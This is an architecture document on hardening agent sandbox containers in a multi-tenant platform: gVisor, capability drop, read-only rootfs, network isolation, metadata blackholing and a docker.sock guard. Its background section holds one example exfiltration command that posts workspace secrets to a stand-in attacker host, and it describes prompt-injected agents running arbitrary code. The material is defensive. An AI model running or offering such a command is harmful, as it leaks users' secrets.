# Container Hardening Architecture

This document explains RoleMesh's container hardening module — the work that takes agent containers from "raw runc" up to "an industry-mainstream multi-tenant AaaS sandbox baseline."

It covers why this layer is the bedrock of agent security, which alternatives were considered and rejected, what each of the nine hardening requirements (R1–R9) actually solves, and a few real pitfalls worth recording from the implementation.

Target audience: developers extending agent container configuration, introducing a new runtime (e.g. Firecracker), debugging container startup failures, or deploying RoleMesh on a new platform. Prerequisite: [`13-safety-overview.md`](13-safety-overview.md) §2.1.

---

## Background: Why Raw Docker Is Not Enough

RoleMesh's agent containers execute **LLM-generated, user-influenced code** — a fundamentally different shape from containers running traditional microservices:

- An agent might run `Bash(command="curl evil.com -d @/workspace/secrets")` — you cannot exhaustively enumerate "what it will do" at coding time
- Multi-tenant shared host — one escape = all customers' data leaked, an existential issue
- LLM output via prompt injection can produce arbitrary system calls — you must assume **any code** in the container may execute

Raw Docker (runc + default config) has several critical shortcomings in this scenario:

1. **Shares the host kernel** — one kernel CVE (Dirty Pipe, netfilter holes) can pierce from container to host
2. **Many capabilities by default** — container root is effectively close to host root
3. **Writable rootfs** — attackers can persist backdoors, poison `/usr/bin/`
4. **No resource defaults** — a runaway agent can OOM the host or fork-bomb the PID space
5. **No dedicated network isolation** — all containers share the default bridge; metadata IP (`169.254.169.254`) is reachable
6. **`docker.sock` accidentally mounted** — instant host-root inside the container

No single point is fatal, but stacked they form the well-known consensus that "raw Docker is unfit for running untrusted code." OpenAI Code Interpreter, AWS Lambda, Modal, E2B, Fly.io all use some form of hardening — RoleMesh must too.

---

## Design Goals

1. **Industry-mainstream multi-tenant AaaS sandbox baseline.** Not pursuing "absolute security," but matching the isolation strength of OpenAI Code Interpreter.
2. **Secure by default.** Default config values are the "safe" choice; operators need an explicit env switch to relax, and the relaxation logs an alert.
3. **Smooth rollback.** Every hardening can be reverted via env to old behavior so that bug triage can disentangle "is hardening the cause" vs "is the agent code the cause."
4. **Zero behavioral change for business logic.** Agent business logic, tool semantics, conversation flow are fully unaffected. Operators don't notice hardening exists unless they `docker inspect`.
5. **Cross-platform consistency.** macOS Docker Desktop, Linux native Docker, Windows WSL behave largely the same; we do not depend on features that exist in only one environment.
6. **Observable.** Every limit has a structured log line (with `tenant_id`, `coworker_id`) to support post-hoc audit.

---

## Considered Alternatives

### Alternative A — Stay on Raw runc, Rely Entirely on Application-Layer Defense

Add prompt defenses in agent code ("do not execute dangerous commands"), tool allowlists, approval workflow. Touch nothing at the container layer.

**Pros**: Zero deployment change, zero compatibility risk.

**Cons**: A successful prompt-injection attack = arbitrary code in the container = the full host kernel attack surface is exposed = multi-tenant total loss. "Application-layer defense" cannot be the sole line of defense in the agent scenario ([`13-safety-overview.md`](13-safety-overview.md) §5.2).

**Rejected** — violates "defense in depth."

### Alternative B — Go Straight to Firecracker microVM

Each agent runs in an independent KVM microVM, hardware-level isolation. The AWS Lambda / Fly.io Machines model.

**Pros**: Maximum isolation strength; CPU side-channels also blocked.

**Cons**:
- Requires rewriting the entire container orchestration layer (Docker → firecracker-containerd or Kata), months of work
- +500 ms~1 s startup time (acceptable in agent scenarios but too many other changes)
- Decouples from Docker ecosystem (volume, network, log collection all redone)
- Team mental model shifts from "container" to "VM," high operator cost

**Rejected (V1)** — leaving a door open. Revisit in V2 if a compliance customer demands hardware-level isolation.

### Alternative C — gVisor + Docker Built-in Hardening Options (Selected)

Keep using Docker / containerd orchestration, switch the OCI runtime to gVisor's `runsc`, while turning on all safety options in Docker's HostConfig (CapDrop, ReadonlyRootfs, Tmpfs, PidsLimit, etc.).

**Pros**:
- gVisor user-space kernel shrinks the host kernel attack surface to ~20 syscalls — stops most kernel CVEs
- Small change: swap a runtime flag + configure HostConfig, 2 days of work
- Fully compatible with Docker ecosystem — volume, network, log unchanged
- Same isolation tier as Google Cloud Run, OpenAI Code Interpreter

**Cons**:
- gVisor 5–30% performance overhead (more visible for IO-heavy workloads) — but agent bottleneck is LLM call latency, CPU is not critical
- A few syscalls unsupported — typical Python/Node toolchains all work; per-coworker fallback to runc if needed

**Selected** — this is the shape described in the rest of this document.

---

## Nine Hardening Requirements (R1–R9)

Organized "from inner defense to outer defense."

### R1. Switchable OCI Runtime

| | |
|---|---|
| **Config** | `CONTAINER_OCI_RUNTIME=runc\|runsc`; per-coworker override at `coworkers.container_config.runtime` |
| **What it solves** | Container escape via kernel exploit |
| **Key decision** | Per-coworker override — a trusted super-agent running heavy-IO workloads may use runc for performance; normal agents default to runsc |

### R2. User Namespace Remap

| | |
|---|---|
| **Config** | dockerd userns-remap (deployment-level configuration) |
| **What it solves** | Even on escape, container root is a normal user from the host's perspective |
| **Key decision** | Not enforced in code (dockerd daemon-level setting), but deployment docs require it; the code refuses `Privileged=true` and host PID/IPC namespaces, guarded by invariant tests |

### R3. Drop ALL Capabilities + Seccomp

| | |
|---|---|
| **Config** | `CapDrop=["ALL"]` + `no-new-privileges` + Docker default seccomp profile + apparmor docker-default |
| **What it solves** | Even container root cannot `iptables`, `mount`, `ptrace`, change time |
| **Key decision** | We do not maintain a custom seccomp profile (operator cost too high); Docker's default profile is already narrow enough |

### R4. Read-only Rootfs + tmpfs

| | |
|---|---|
| **Config** | `ReadonlyRootfs=true`; tmpfs for `/tmp` (64 MB), `/home/agent/.cache` (64 MB), `/home/agent/.config` (8 MB), `/home/agent/.pi` (32 MB) |
| **What it solves** | After landing, attackers cannot persist or poison system files; container restart wipes clean |
| **Real pitfall** | Claude Code CLI writes `/home/agent/.claude.json` by default — required `CLAUDE_CONFIG_DIR` redirect + a persistent bind mount. Before turning on strong readonly, you must `strace` through a real agent task to enumerate all write paths; otherwise SDKs fail silently and are hard to debug |
| **Supplementary design** | Introduced `ErofsWatcher` — runtime watcher on agent stderr that dedupes and surfaces `[Errno 30] Read-only file system`, prompting operators to extend the tmpfs allowlist |

### R5. Independent Network + Metadata Blackhole

| | |
|---|---|
| **Config** | Bridge network `rolemesh-agent-net`, `enable_icc=false` (no inter-container traffic); ExtraHosts blackhole `169.254.169.254` / `metadata.google.internal` |
| **What it solves** | Prevents agents from stealing IAM credentials via cloud metadata; prevents lateral movement between tenants |
| **Key decision** | The EC-1 phase (see [`16-egress-control-architecture.md`](16-egress-control-architecture.md)) will change this network to `--internal`, further severing the physical route to the internet — Container Hardening provides the baseline, Egress Control provides the upgrade |
| **Real pitfall** | On Linux native Docker, `host.docker.internal` requires explicit `host-gateway` injection (dockerd ≥ 20.10); container hardening handles this via ExtraHosts, and acceptance tests must run on Linux native Docker, not just macOS Docker Desktop |

### R6. Docker Socket Guard

| | |
|---|---|
| **Config** | An invariant test scans every spec's Binds; basename == `docker.sock` is rejected |
| **What it solves** | Once `/var/run/docker.sock` is mounted, the container immediately gains the ability to create privileged containers and read the host filesystem — equivalent to handing the attacker host root |
| **Key decision** | Use exact basename match instead of substring (to avoid false positives on legitimate paths like `docker.socket-tests/foo`); the test sweeps every possible input combination |

### R7. Hard Resource Ceilings

| | |
|---|---|
| **Config** | Memory default 2 GB (ceiling 8 GB), CPU 2.0 (ceiling 4.0), PidsLimit 512, `MemorySwap=Memory` (swap disabled) |
| **What it solves** | Runaway OOM, fork bombs, swap amplification consuming disk IO |
| **Key decision** | Global ceilings **enforce a clamp** — per-coworker configs exceeding the ceiling are silently clamped + alerted; admins cannot bypass |

### R8. Env Allowlist

| | |
|---|---|
| **Config** | 12 envs explicitly allowlisted: `TZ / NATS_URL / JOB_ID / AGENT_BACKEND / *_API_KEY / *_BASE_URL / CLAUDE_CODE_OAUTH_TOKEN / CLAUDE_CONFIG_DIR / HOME / PI_MODEL_ID` |
| **What it solves** | Prevents host-sensitive env (including other agents' secrets) leaking into the container; prevents backend `extra_env` from randomly injecting unaudited variables |
| **Key decision** | `PATH / LANG / LC_ALL / PYTHONUNBUFFERED` are **not** in the allowlist — they are image properties, fixed in Dockerfile `ENV` rather than being per-tenant config; the startup log only records env **keys**, never values |

### R9. Dockerfile Hardening

| | |
|---|---|
| **Config** | UID 1000 (non-root); `LANG=C.UTF-8 LC_ALL=C.UTF-8 PYTHONUNBUFFERED=1` fixed; `HEALTHCHECK NONE` |
| **What it solves** | Default non-root in container; locale / Python buffer unaffected by host; no Docker default healthcheck spawning extra shell processes |
| **Real pitfall** | UID was originally set to 10001 (to avoid the host user 1000–1999 range) but collided with the host-created session directory (owner=1000) on dev laptops, causing EACCES — reverted to 1000 + a long comment in Dockerfile explaining "if you really want UID isolation, go through daemon-level userns-remap." The rationale for this rollback must stay in the code or the next reviewer will think "why not 10001 for better security" and undo it |

---

## Architecture

### Config Flow

```
src/rolemesh/core/config.py       (CONTAINER_*  global env config)
        │
        ▼
src/rolemesh/core/types.py        (ContainerConfig  per-coworker overrides)
        │
        ▼
src/rolemesh/container/runner.py:build_container_spec()
        │ (merge global default ← coworker override ← backend override
        │  + clamp to hard ceilings + alert)
        ▼
src/rolemesh/container/runtime.py:ContainerSpec  (dataclass)
        │
        ▼
src/rolemesh/container/docker_runtime.py:_spec_to_config()
        │ (translate to Docker HostConfig dict)
        ▼
aiodocker.containers.create()
```

### Network Topology (Container Hardening Phase)

```
┌── Host ──────────────────────────────────────────────────┐
│                                                          │
│  ┌── rolemesh-agent-net (bridge, ICC=false) ──────────┐ │
│  │                                                     │ │
│  │   agent-coworker-A   agent-coworker-B   ...         │ │
│  │   (containers cannot reach each other)              │ │
│  │                                                     │ │
│  │   ExtraHosts:                                       │ │
│  │     169.254.169.254 → 127.0.0.1                     │ │
│  │     metadata.google.internal → 127.0.0.1            │ │
│  │     host.docker.internal → host-gateway             │ │
│  │                                                     │ │
│  └─────────────────────────────────────────────────────┘ │
│                          ↓                               │
│           credential_proxy (host process, port 3001)     │
│                          ↓                               │
│                       Internet                           │
└──────────────────────────────────────────────────────────┘
```

**Note**: The Egress Control phase reshapes this topology into a DMZ pattern (agent network becomes `--internal`, proxy containerized, new egress network added). See [`16-egress-control-architecture.md`](16-egress-control-architecture.md).

### Startup Order

`src/rolemesh/main.py` orchestrator startup runs the following strictly in order; any failure refuses traffic:

1. `ensure_available()` — dockerd version gate (≥ 20.10)
2. `ensure_agent_network()` — create / verify `rolemesh-agent-net`
3. `verify_proxy_reachable()` — temporary probe container checks `host.docker.internal:3001` reachability
4. `cleanup_orphans()` — clean residual containers from prior crash
5. Accept traffic

Startup order is pinned in `tests/container/test_startup_order.py` so future refactors cannot scramble it.

---

## Tradeoffs and Boundaries

### Accepted Tradeoffs

- **gVisor 5–30% performance overhead**: in exchange for drastic reduction in host kernel attack surface. Agent bottleneck is LLM-call latency; CPU is not key.
- **An extra NetworkMode + startup-order constraint**: increases deployment complexity, in exchange for metadata blackhole + ICC isolation.
- **Lost some debugging convenience**: read-only rootfs makes "shell into the container and tweak a file" impossible — but that is precisely the point; attackers cannot either.

### Explicitly Out of Scope (belongs to other layers or later work)

- **Egress proxy / URL allowlist** → Egress Control module
- **Per-request access control / approval** → Safety Framework / Approval module
- **DNS exfiltration defense** → Egress Control module
- **Firecracker / Kata** → V2 candidate
- **Runtime threat detection (Falco)** → Monitoring layer
- **Image signing / vulnerability scan** → CI/CD layer

### Verification Baseline

The minimum set that must be verified after hardening (pinned in `tests/container/test_hardening_invariants.py`):

- `Privileged` is never true
- `CapDrop` always contains `ALL`
- `SecurityOpt` always contains `no-new-privileges:true`
- `SecurityOpt` never contains `seccomp=unconfined`
- No mount path's basename is ever `docker.sock`
- Env keys are always a subset of the allowlist
- `MemorySwap` == `Memory` (swap disabled)

These invariants sweep 200+ configuration combinations (runtime × backend × mount × auth × UID); any violating combination fails the test.

---

## In One Sentence

**Container Hardening lifts RoleMesh agent containers from "raw runc" to "industry-mainstream multi-tenant AaaS sandbox baseline"**: gVisor user-space kernel + full capability strip + read-only rootfs + tmpfs + hard resource ceilings + independent network + metadata blackhole + docker.sock guard + env allowlist.

This layer is the **bedrock** of the "defense in depth" mentioned in [`13-safety-overview.md`](13-safety-overview.md) — the Safety Framework and Egress Control above it assume container isolation is already correct. A flawed bedrock invalidates upper-layer defenses.
